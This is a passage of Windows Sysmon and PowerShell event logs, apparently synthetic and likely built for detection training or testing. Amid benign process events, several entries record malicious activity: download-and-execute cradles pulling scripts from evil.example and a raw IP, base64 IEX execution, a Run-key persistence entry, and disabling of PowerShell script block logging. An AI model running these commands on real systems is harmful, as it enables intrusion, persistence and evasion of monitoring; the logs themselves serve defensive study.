    <Data Name="ProcessGuid">{704147ab-bdff-4a6b-aff8-ed82c52a41a6}</Data>
    <Data Name="ProcessId">10003</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File setup.ps1</Data>
    <Data Name="CurrentDirectory">C:\Users\mwilson\</Data>
    <Data Name="User">CORP\mwilson</Data>
    <Data Name="ParentProcessGuid">{024c1b21-7e4f-4cdd-b146-8e08ad060f79}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:04:00.0000000Z" />
    <EventRecordID>4</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS04</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:04:00.000</Data>
    <Data Name="ProcessGuid">{fe67631a-1260-4d2a-ba9b-41767713f349}</Data>
    <Data Name="ProcessId">10004</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -c (New-Object Net.WebClient).DownloadString('http://evil.example/stage2.ps1')</Data>
    <Data Name="CurrentDirectory">C:\Users\tlee\</Data>
    <Data Name="User">CORP\tlee</Data>
    <Data Name="ParentProcessGuid">{a5163e69-82ef-4339-beee-5eaa329ae94a}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:05:00.0000000Z" />
    <EventRecordID>5</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS05</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:05:00.000</Data>
    <Data Name="ProcessGuid">{0f29869b-007f-488b-808e-5114a2bb4e74}</Data>
    <Data Name="ProcessId">10005</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -c Invoke-WebRequest http://185.220.101.50/payload</Data>
    <Data Name="CurrentDirectory">C:\Users\pgomez\</Data>
    <Data Name="User">CORP\pgomez</Data>
    <Data Name="ParentProcessGuid">{0c27402a-7f1c-4bfb-81bd-8e2056f79be7}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>3</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:05:12.0000000Z" />
    <EventRecordID>6</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS05</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:05:12.000</Data>
    <Data Name="ProcessGuid">{0f29869b-007f-488b-808e-5114a2bb4e74}</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="User">CORP\pgomez</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="SourceIp">192.168.1.50</Data>
    <Data Name="SourcePort">49512</Data>
    <Data Name="DestinationIp">185.220.101.50</Data>
    <Data Name="DestinationPort">443</Data>
    <Data Name="DestinationHostname" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:06:12.0000000Z" />
    <EventRecordID>7</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS06</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:06:12.000</Data>
    <Data Name="ProcessGuid">{b83a53f5-e1b0-40f1-b7f8-eb9292666177}</Data>
    <Data Name="ProcessId">10007</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -File C:\Scripts\backup.ps1</Data>
    <Data Name="CurrentDirectory">C:\Users\swhite\</Data>
    <Data Name="User">CORP\swhite</Data>
    <Data Name="ParentProcessGuid">{b548a5a4-bcea-4808-b059-0fa7962538ce}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:07:12.0000000Z" />
    <EventRecordID>8</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS07</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:07:12.000</Data>
    <Data Name="ProcessGuid">{d9bae731-c00d-46f4-8cf1-386e1543a85d}</Data>
    <Data Name="ProcessId">10008</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -c IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('...')))</Data>
    <Data Name="CurrentDirectory">C:\Users\bwong\</Data>
    <Data Name="User">CORP\bwong</Data>
    <Data Name="ParentProcessGuid">{171a991f-2740-4cec-896c-17c59e20b912}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:08:12.0000000Z" />
    <EventRecordID>9</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS08</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:08:12.000</Data>
    <Data Name="ProcessGuid">{70ff748d-adef-429a-b1f9-83a2e5996e3b}</Data>
    <Data Name="ProcessId">10009</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -c Get-Process</Data>
    <Data Name="CurrentDirectory">C:\Users\cchen\</Data>
    <Data Name="User">CORP\cchen</Data>
    <Data Name="ParentProcessGuid">{a4c5bf5a-79d7-40e8-ad7f-4691142e9b4f}</Data>
    <Data Name="ParentImage">C:\Program Files\Java\jre\bin\java.exe</Data>
    <Data Name="ParentCommandLine">java.exe -jar app.jar</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:09:12.0000000Z" />
    <EventRecordID>10</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS09</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:09:12.000</Data>
    <Data Name="ProcessGuid">{feb1b068-ea42-4b11-93dd-912a86e11cc1}</Data>
    <Data Name="ProcessId">10010</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -c Set-ItemProperty -Path HKCU:\...\Run -Name Updater -Value C:\Users\dking\AppData\Local\Temp\up.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\dking\</Data>
    <Data Name="User">CORP\dking</Data>
    <Data Name="ParentProcessGuid">{6005be66-3b80-42ed-b8ad-240ddcd8fa8a}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>13</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:09:20.0000000Z" />
    <EventRecordID>11</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS09</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:09:20.000</Data>
    <Data Name="ProcessGuid">{feb1b068-ea42-4b11-93dd-912a86e11cc1}</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="EventType">SetValue</Data>
    <Data Name="TargetObject">HKU\S-1-5-21-111-222-333-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater</Data>
    <Data Name="Details">C:\Users\dking\AppData\Local\Temp\up.exe</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>13</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:10:20.0000000Z" />
    <EventRecordID>12</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:10:20.000</Data>
    <Data Name="ProcessGuid">{19ecf063-cd21-4b6b-b050-95ec21236003}</Data>
    <Data Name="Image">C:\Windows\System32\reg.exe</Data>
    <Data Name="EventType">SetValue</Data>
    <Data Name="TargetObject">HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging</Data>
    <Data Name="Details">DWORD (0x00000000)</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4104</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:11:20.0000000Z" />
    <EventRecordID>13</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>WIN-WKS10</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://evil.example/loader.ps1'); [Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQAAMAAAAEAAAA...'))</Data>
    <Data Name="ScriptBlockId">{9bc8f1aa-01fa-4f65-9778-5c64ab2de84e}</Data>
    <Data Name="Path" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:13:20.0000000Z" />
    <EventRecordID>14</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS11</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:13:20.000</Data>
    <Data Name="ProcessGuid">{670e4fc3-42a9-4682-a344-8f740bcf1b70}</Data>
    <Data Name="ProcessId">10014</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -Command Get-ChildItem C:\Users\emartin\Documents</Data>
    <Data Name="CurrentDirectory">C:\Users\emartin\</Data>
    <Data Name="User">CORP\emartin</Data>
    <Data Name="ParentProcessGuid">{8f4a77c9-4324-4455-84be-cc2be4bfd808}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:14:20.0000000Z" />
    <EventRecordID>15</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS12</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:14:20.000</Data>
    <Data Name="ProcessGuid">{4102bb2f-a67e-4420-a91d-7cd65b06cd1f}</Data>
    <Data Name="ProcessId">10015</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c dir</Data>
    <Data Name="CurrentDirectory">C:\Users\fowen\</Data>
    <Data Name="User">CORP\fowen</Data>
    <Data Name="ParentProcessGuid">{a330bea9-b01c-4893-b128-2a0ba2d03a5d}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:15:20.0000000Z" />
    <EventRecordID>16</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS13</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:15:20.000</Data>
    <Data Name="ProcessGuid">{5f93ff61-09b3-49b4-b8f0-8dbecb9a47a2}</Data>
    <Data Name="ProcessId">10016</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -Command Get-Service</Data>
    <Data Name="CurrentDirectory">C:\Users\gtan\</Data>
    <Data Name="User">CORP\gtan</Data>
    <Data Name="ParentProcessGuid">{62ccd0ee-5921-499e-b0b4-93a9202832f0}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>3</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:15:30.0000000Z" />
    <EventRecordID>17</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS13</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:15:30.000</Data>
    <Data Name="ProcessGuid">{5f93ff61-09b3-49b4-b8f0-8dbecb9a47a2}</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="User">CORP\gtan</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="SourceIp">192.168.1.50</Data>
    <Data Name="SourcePort">49512</Data>
    <Data Name="DestinationIp">13.107.42.14</Data>
    <Data Name="DestinationPort">443</Data>
    <Data Name="DestinationHostname" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>13</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:16:30.0000000Z" />
    <EventRecordID>18</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS14</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:16:30.000</Data>
    <Data Name="ProcessGuid">{18fcaca1-319a-4608-ac47-0ea74dcb9009}</Data>
    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
    <Data Name="EventType">SetValue</Data>
    <Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\SomeService\Start</Data>
    <Data Name="Details">2</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4104</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:17:30.0000000Z" />
    <EventRecordID>19</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>WIN-WKS15</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockText">Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending</Data>
    <Data Name="ScriptBlockId">{bc52f791-0faf-4ed4-ae0d-14e3248fc4a2}</Data>
    <Data Name="Path">C:\Scripts\monitor.ps1</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:01:00.0000000Z" />
    <EventRecordID>1</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:01:00.000</Data>
    <Data Name="ProcessGuid">{7cd65c2e-2b33-444a-b7f1-0c97bbd90753}</Data>
    <Data Name="ProcessId">10001</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
    <Data Name="User">CORP\jdoe</Data>
    <Data Name="ParentProcessGuid">{79f2e218-d09a-4c81-bd77-096452a977e6}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
